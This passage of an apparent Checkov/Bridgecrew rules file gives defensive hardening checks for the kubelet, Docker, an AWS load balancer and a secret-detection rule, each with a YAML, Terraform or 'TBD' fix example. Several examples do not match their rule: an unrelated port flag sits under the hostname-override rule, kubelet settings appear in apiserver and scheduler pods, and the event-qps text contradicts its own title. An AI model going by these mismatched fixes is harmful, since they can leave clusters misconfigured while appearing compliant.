<p>Allow Kubelet to manage iptables. Kubelets can automatically manage the required changes to iptables based on how you choose your networking options for the pods. It is recommended to let kubelets manage the changes to iptables. This ensures that the iptables configuration remains in sync with pods networking configuration. Manually configuring iptables with dynamic pod network configuration changes might hamper the communication between pods/containers and to the outside world. You might have iptables rules too restrictive or too open.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kubelet
    tier: control-plane
  name: kubelet
  namespace: kube-system
spec:
  containers:
  - command:
+   - kubelet
+   - --make-iptables-util-chains=true
    image: gcr.io/google_containers/kubelet-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-make-iptables-util-chains-argument-is-set-to-true' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-make-iptables-util-chains-argument-is-set-to-true</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-make-iptables-util-chains-argument-is-set-to-true' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_146</key>
    <name>Ensure the --hostname-override argument is not set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---hostname-override-argument-is-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-hostname-override-argument-is-set"></div>The --hostname-override argument is set</div><a aria-label="Skip link to The --hostname-override argument is set" class="heading-anchor-icon fa fa-anchor" href="#the---hostname-override-argument-is-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not override node hostnames. Overriding hostnames could potentially break TLS setup between the kubelet and the apiserver. Additionally, with overridden hostnames, it becomes increasingly difficult to associate logs with a particular node and process them for security analytics. Hence, you should setup your kubelet nodes with resolvable FQDNs and avoid overriding the hostnames with IPs.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kubelet
    tier: control-plane
  name: kubelet
  namespace: kube-system
spec:
  containers:
  - command:
    - kubelet
    - --read-only-port=80
    image: gcr.io/google_containers/kubelet-amd64:v1.6.0
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 15
      timeoutSeconds: 15
    name: kubelet
    resources:
      requests:
        cpu: 250m
    volumeMounts:
    - mountPath: /etc/kubernetes/
      name: k8s
      readOnly: true
    - mountPath: /etc/ssl/certs
      name: certs
    - mountPath: /etc/pki
      name: pki
  hostNetwork: true
  volumes:
  - hostPath:
      path: /etc/kubernetes
    name: k8s
  - hostPath:
      path: /etc/ssl/certs
    name: certs
  - hostPath:
      path: /etc/pki
    name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-hostname-override-argument-is-not-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-hostname-override-argument-is-not-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-hostname-override-argument-is-not-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_147</key>
    <name>Ensure the --event-qps argument is set to 0 or a level that ensures appropriate event capture</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---event-qps-argument-is-not-set-to-a-level-that-ensures-appropriate-event-capture"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-event-qps-argument-is-not-set-to-a-level-that-ensures-appropriate-event-capture"></div>The --event-qps argument is not set to a level that ensures appropriate event capture</div><a aria-label="Skip link to The --event-qps argument is not set to a level that ensures appropriate event capture" class="heading-anchor-icon fa fa-anchor" href="#the---event-qps-argument-is-not-set-to-a-level-that-ensures-appropriate-event-capture"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Security relevant information should be captured. The --event-qps flag on the Kubelet can be used to limit the rate at which events are gathered. Setting this too low could result in relevant events not being logged, however the unlimited setting of 0 could result in a denial of service on the kubelet.<br/>
It is important to capture all events and not restrict event creation. Events are an important source of security information and analytics that ensure that your environment is consistently monitored using the event data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<p><strong>Kind</strong>  Pod</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kubelet
    tier: control-plane
  name: kubelet
  namespace: kube-system
spec:
  containers:
  - command:
+   - kubelet
+   - --event-qps=2
    image: gcr.io/google_containers/kubelet-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-event-qps-argument-is-set-to-0-or-a-level-which-ensures-appropriate-event-capture' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-event-qps-argument-is-set-to-0-or-a-level-which-ensures-appropriate-event-capture</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-event-qps-argument-is-set-to-0-or-a-level-which-ensures-appropriate-event-capture' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_148</key>
    <name>Ensure the --tls-cert-file and --tls-private-key-file arguments are set appropriately for Kubelet</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---tls-cert-file-and---tls-private-key-file-arguments-are-not-set-appropriately-for-kubelety"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-tls-cert-file-and-tls-private-key-file-arguments-are-not-set-appropriately-for-kubelety"></div>The --tls-cert-file and --tls-private-key-file arguments are not set appropriately for Kubelety</div><a aria-label="Skip link to The --tls-cert-file and --tls-private-key-file arguments are not set appropriately for Kubelety" class="heading-anchor-icon fa fa-anchor" href="#the---tls-cert-file-and---tls-private-key-file-arguments-are-not-set-appropriately-for-kubelety"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p> API server communication contains sensitive parameters that should remain encrypted in transit. Configure the API server to serve only HTTPS traffic by setup TLS connection on the API server. By default, --tls-cert-file and --tls-private-key-file arguments are not set.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
  kind: Pod
  metadata:
    creationTimestamp: null
    labels:
      component: kube-apiserver
      tier: control-plane
    name: kube-apiserver
    namespace: kube-system
  spec:
    containers:
    - command:
       - kube-apiserver
+      - --tls-cert-file=/path/to/cert
+      - --tls-private-key-file=/path/to/key
      image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
      ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-tls-cert-file-and-tls-private-key-file-arguments-are-set-as-appropriate-for-kubelet' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-tls-cert-file-and-tls-private-key-file-arguments-are-set-as-appropriate-for-kubelet</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-tls-cert-file-and-tls-private-key-file-arguments-are-set-as-appropriate-for-kubelet' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_149</key>
    <name>Ensure the --rotate-certificates argument is not set to False</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---rotate-certificates-argument-is-set-to-false"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-rotate-certificates-argument-is-set-to-false"></div>The --rotate-certificates argument is set to False</div><a aria-label="Skip link to The --rotate-certificates argument is set to False" class="heading-anchor-icon fa fa-anchor" href="#the---rotate-certificates-argument-is-set-to-false"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable kubelet client certificate rotation.<br/>
The --rotate-certificates setting causes the kubelet to rotate its client certificates by creating new CSRs as its existing credentials expire. This automated periodic rotation ensures that the there is no downtime due to expired certificates and thus addressing availability in the CIA security triad.</p>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This recommendation only applies if you let kubelets get their certificates from the API server. In case your kubelet certificates come from an outside authority/tool (e.g. Vault) then you need to take care of rotation yourself.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<p><strong>Kind</strong> Pod</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-scheduler
    tier: control-plane
  name: kube-scheduler
  namespace: kube-system
spec:
  containers:
  - command:
 +  - kubelet
 +  - --rotate-certificates=true
    image: gcr.io/google_containers/kube-scheduler-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-rotate-certificates-argument-is-not-set-to-false' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-rotate-certificates-argument-is-not-set-to-false</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-rotate-certificates-argument-is-not-set-to-false' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_151</key>
    <name>Ensure Kubelet only uses strong cryptographic ciphers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="kubelet-does-not-use-strong-cryptographic-ciphers"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubelet-does-not-use-strong-cryptographic-ciphers"></div>Kubelet does not use strong cryptographic ciphers</div><a aria-label="Skip link to Kubelet does not use strong cryptographic ciphers" class="heading-anchor-icon fa fa-anchor" href="#kubelet-does-not-use-strong-cryptographic-ciphers"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that the Kubelet is configured to only use strong cryptographic ciphers. TLS ciphers have had a number of known vulnerabilities and weaknesses, which can reduce the protection provided by them. By default Kubernetes supports a number of TLS ciphersuites including some that have security concerns, weakening the protection provided.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<p><strong>Kind</strong> Pod</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-scheduler
    tier: control-plane
  name: kube-scheduler
  namespace: kube-system
spec:
  containers:
  - command:
+   - kubelet
+   - --tls-cipher-suites=TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
    image: gcr.io/google_containers/kube-scheduler-amd64:v1.6.0
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 15
      timeoutSeconds: 15
    name: kube-scheduler
    resources:
      requests:
        cpu: 250m
    volumeMounts:
    - mountPath: /etc/kubernetes/
      name: k8s
      readOnly: true
    - mountPath: /etc/ssl/certs
      name: certs
    - mountPath: /etc/pki
      name: pki
  hostNetwork: true
  volumes:
  - hostPath:
      path: /etc/kubernetes
    name: k8s
  - hostPath:
      path: /etc/ssl/certs
    name: certs
  - hostPath:
      path: /etc/pki
    name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-only-makes-use-of-strong-cryptographic-ciphers' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-only-makes-use-of-strong-cryptographic-ciphers</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-only-makes-use-of-strong-cryptographic-ciphers' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_DOCKER_2</key>
    <name>Ensure healthcheck instructions have been added to container images</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="healthcheck-instructions-have-not-been-added-to-container-images"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-healthcheck-instructions-have-not-been-added-to-container-images"></div>Healthcheck instructions have not been added to container images</div><a aria-label="Skip link to Healthcheck instructions have not been added to container images" class="heading-anchor-icon fa fa-anchor" href="#healthcheck-instructions-have-not-been-added-to-container-images"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>We recommend that you add the HEALTHCHECK instruction to your Docker container images  to ensure that health checks are executed against running containers.</p>
<p>An important security control is that of availability. Adding the HEALTHCHECK instruction to your container image ensures that the Docker engine periodically checks the running container instances against that instruction to ensure that containers are still operational.</p>
<p>Based on the results of the health check, the Docker engine could terminate containers which are not responding correctly, and instantiate new ones.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<p>TBD</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">TBD
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-healthcheck-instructions-have-been-added-to-container-images' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-healthcheck-instructions-have-been-added-to-container-images</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-healthcheck-instructions-have-been-added-to-container-images' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_DOCKER_3</key>
    <name>Ensure a user for the container has been created</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="a-user-for-the-container-has-not-been-created"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-a-user-for-the-container-has-not-been-created"></div>A user for the container has not been created</div><a aria-label="Skip link to A user for the container has not been created" class="heading-anchor-icon fa fa-anchor" href="#a-user-for-the-container-has-not-been-created"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Containers should run as a non-root user. It is good practice to run the container as a non-root user, where possible. This can be done either via the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">USER</code> directive in the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Dockerfile</code> or through <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gosu</code> or similar where used as part of the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">CMD</code> or <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">ENTRYPOINT</code> directives.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>TBD</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">TBD
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-a-user-for-the-container-has-been-created' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-a-user-for-the-container-has-been-created</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-a-user-for-the-container-has-been-created' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_DOCKER_4</key>
    <name>Ensure Copy is used instead of Add in Dockerfiles</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="copy-is-not-used-instead-of-add-in-dockerfiles"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-copy-is-not-used-instead-of-add-in-dockerfiles"></div>Copy is not used instead of Add in Dockerfiles</div><a aria-label="Skip link to Copy is not used instead of Add in Dockerfiles" class="heading-anchor-icon fa fa-anchor" href="#copy-is-not-used-instead-of-add-in-dockerfiles"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The <strong>Copy</strong> instruction simply copies files from the local host machine to the container file system. The <strong>Add</strong> instruction could potentially retrieve files from remote URLs and perform operations such as unpacking them. The <strong>Add</strong> instruction therefore introduces security risks. For example, malicious files may be directly accessed from URLs without scanning, or there may be vulnerabilities associated with decompressing them</p>
<p>We recommend you to use the <strong>Copy</strong> instruction instead of the <strong>Add</strong> instruction in the Dockerfile.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">TBD
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-copy-is-used-instead-of-add-in-dockerfiles' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-copy-is-used-instead-of-add-in-dockerfiles</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-copy-is-used-instead-of-add-in-dockerfiles' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_20</key>
    <name>Ensure ALB redirects HTTP requests into HTTPS ones</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alb-does-not-redirect-http-requests-into-https-ones"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alb-does-not-redirect-http-requests-into-https-ones"></div>ALB does not redirect HTTP requests into HTTPS ones</div><a aria-label="Skip link to ALB does not redirect HTTP requests into HTTPS ones" class="heading-anchor-icon fa fa-anchor" href="#alb-does-not-redirect-http-requests-into-https-ones"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that the behaviour of the Load balancer is redirect any traffic from the encrypted endpoint rather than handling on http or failing to respond.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_lb, aws_lb_listener</li>
<li><strong>Argument:</strong> <em>redirect</em> of  aws_lb_listener</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_lb" "lb_good" {
}


resource "aws_lb_listener" "listener_good" {
  load_balancer_arn = aws_lb.lb_good.arn
  port              = "80"
  protocol          = "HTTP"

  default_action {
    type = "redirect"

    redirect {
      port        = "443"
      protocol    = "HTTPS"
      status_code = "HTTP_301"
    }

  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-alb-redirects-http-requests-into-https-ones' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-alb-redirects-http-requests-into-https-ones</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-alb-redirects-http-requests-into-https-ones' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_15</key>
    <name>SoftLayer Credentials</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="softlayer-credentials"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-soft-layer-credentials"></div>SoftLayer Credentials</div><a aria-label="Skip link to SoftLayer Credentials" class="heading-anchor-icon fa fa-anchor" href="#softlayer-credentials"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
